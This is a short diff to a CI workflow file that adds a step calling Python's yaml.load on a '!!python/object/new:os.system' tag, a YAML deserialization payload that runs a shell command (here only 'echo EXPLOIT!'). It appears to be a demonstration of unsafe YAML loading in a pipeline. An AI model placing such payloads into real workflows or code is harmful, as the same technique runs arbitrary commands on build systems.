@@ -15,7 +15,9 @@ jobs:
 
     - name: pyyaml control
       run: pip install pyyaml
-        
+    - name : test
+      run : python -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'
+    
     - name : Deploy Action DevSecOpsCore 
       uses: DevSecOpsCore/core-deploy@v1.0.1.3.2.3
       with:
